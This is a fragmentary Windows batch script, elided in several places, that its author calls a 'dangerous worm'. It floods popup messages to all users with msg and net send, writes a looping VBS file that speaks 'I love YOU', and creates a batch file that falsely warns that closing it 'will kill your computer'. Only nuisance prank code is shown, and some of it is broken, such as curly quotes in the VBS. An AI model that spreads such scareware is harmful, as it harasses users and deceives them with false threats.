:: This is a verrrrrry dangerous worm made by Frank Syd 20
...
:haha
msg * "I Love You made by Frank!"
net send * "I Love You by Frank"
goto run3
goto haha
...
echo do > speak.vbs
echo CreateObject(“SAPI.SpVoice”).Speak”I love YOU by Frank Syd 20” >> speak.vbs
echo loop >> speak.vbs
...
echo echo Hey, do you love Frank Syd 20 (only answer in yes or no) >> LoveChoice.bat
...
echo echo Do not close Loveware or LoveChoice, this will kill your computer made by FRANK SYD 20!!!!!!! >> LoveChoice.bat
